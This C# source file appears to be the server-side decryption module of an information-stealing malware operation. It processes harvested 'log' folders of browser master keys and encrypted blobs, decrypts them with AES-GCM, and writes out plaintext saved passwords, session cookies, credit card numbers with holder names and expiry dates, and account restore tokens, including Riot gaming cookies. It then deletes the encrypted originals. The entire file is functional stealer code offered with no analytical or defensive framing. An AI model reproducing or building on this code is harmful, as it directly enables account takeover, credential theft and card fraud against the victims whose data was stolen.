using System;
using System.IO;
using System.Text;
using Leb128;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;

namespace Server.Messages;

internal class DecryptorBrowsers
{
	private const int macBitSize = 128;

	private const int nonceBitSize = 96;

	public static void Start(string log)
	{
		if (Directory.Exists(Path.Combine(log, "Browsers")))
		{
			string[] directories = Directory.GetDirectories(Path.Combine(log, "Browsers"));
			foreach (string text in directories)
			{
				string path = Path.Combine(text, "MasterKey.bin");
				if (File.Exists(path))
				{
					byte[] key = File.ReadAllBytes(path);
					string[] directories2 = Directory.GetDirectories(text);
					foreach (string profile in directories2)
					{
						DecryptPassword(profile, key);
						DecryptCookie(profile, key);
						DecryptCreditCard(profile, key);
						DecryptTokenRestore(profile, key);
					}
					File.Delete(path);
				}
			}
		}
		if (Directory.Exists(Path.Combine(log, "Gaming", "Riot")))
		{
			string path2 = Path.Combine(log, "Gaming", "Riot", "MasterKey.bin");
			if (File.Exists(path2))
			{
				byte[] key2 = File.ReadAllBytes(path2);
				DecryptCookie(Path.Combine(log, "Gaming", "Riot"), key2);
			}
		}
	}

	public static void DecryptPassword(string profile, byte[] key)
	{
		string path = Path.Combine(profile, "EncryptPassword.bin");
		if (!File.Exists(path))
		{
			return;
		}
		object[] array = LEB128.Read(File.ReadAllBytes(path));
		foreach (object obj in array)
		{
			try
			{
				object[] array2 = (object[])obj;
				if (!string.IsNullOrEmpty((string)array2[0]) && !string.IsNullOrEmpty((string)array2[1]))
				{
					string @string = Encoding.UTF8.GetString(DecryptValue((byte[])array2[2], key));
					File.AppendAllText(Path.Combine(profile, "Password.txt"), "Host: " + (string)array2[0] + "\nUsername: " + (string)array2[1] + "\nPassword: " + @string + "\n\n");
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
			}
		}
		File.Delete(path);
	}

	public static void DecryptCookie(string profile, byte[] key)
	{
		string path = Path.Combine(profile, "EncryptCookie.bin");
		if (!File.Exists(path))
		{
			return;
		}
		object[] array = LEB128.Read(File.ReadAllBytes(path));
		foreach (object obj in array)
		{
			try
			{
				object[] array2 = (object[])obj;
				string @string = Encoding.UTF8.GetString(DecryptValue((byte[])array2[4], key));
				File.AppendAllText(Path.Combine(profile, "Cookie.txt"), (string)array2[0] + "\tTRUE\t" + (string)array2[1] + "\tFALSE\t" + (string)array2[2] + "\t" + (string)array2[3] + "\t" + @string + "\r\n");
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
			}
		}
		File.Delete(path);
	}

	public static void DecryptCreditCard(string profile, byte[] key)
	{
		string path = Path.Combine(profile, "EncryptCreditCard.bin");
		if (!File.Exists(path))
		{
			return;
		}
		object[] array = LEB128.Read(File.ReadAllBytes(path));
		foreach (object obj in array)
		{
			try
			{
				object[] array2 = (object[])obj;
				string @string = Encoding.UTF8.GetString(DecryptValue((byte[])array2[0], key));
				File.AppendAllText(Path.Combine(profile, "CreditCard.txt"), "Number: " + @string + "\nExp: " + (string)array2[1] + "/" + (string)array2[2] + "\nHolder: " + (string)array2[3] + "\n\n");
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
			}
		}
		File.Delete(path);
	}

	public static void DecryptTokenRestore(string profile, byte[] key)
	{
		string path = Path.Combine(profile, "EncryptTokenRestore.bin");
		if (!File.Exists(path))
		{
			return;
		}
		object[] array = LEB128.Read(File.ReadAllBytes(path));
		foreach (object obj in array)
		{
			try
			{
				object[] array2 = (object[])obj;
				string @string = Encoding.UTF8.GetString(DecryptValue((byte[])array2[1], key));
				File.AppendAllText(Path.Combine(profile, "TokenRestore.txt"), "AccountId: " + (string)array2[0] + "\nToken: " + @string + "\n\n");
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
			}
		}
		File.Delete(path);
	}

	public static byte[] DecryptValue(byte[] encryptedData, byte[] bMasterKey)
	{
		GcmBlockCipher gcmBlockCipher = new GcmBlockCipher(new AesEngine());
		BinaryReader binaryReader = new BinaryReader(new MemoryStream(encryptedData));
		binaryReader.ReadBytes(3);
		AeadParameters parameters = new AeadParameters(nonce: binaryReader.ReadBytes(12), key: new KeyParameter(bMasterKey), macSize: 128);
		gcmBlockCipher.Init(forEncryption: false, parameters);
		byte[] array = binaryReader.ReadBytes(encryptedData.Length);
		byte[] array2 = new byte[gcmBlockCipher.GetOutputSize(array.Length)];
		int outOff = gcmBlockCipher.ProcessBytes(array, 0, array.Length, array2, 0);
		gcmBlockCipher.DoFinal(array2, outOff);
		return array2;
	}
}
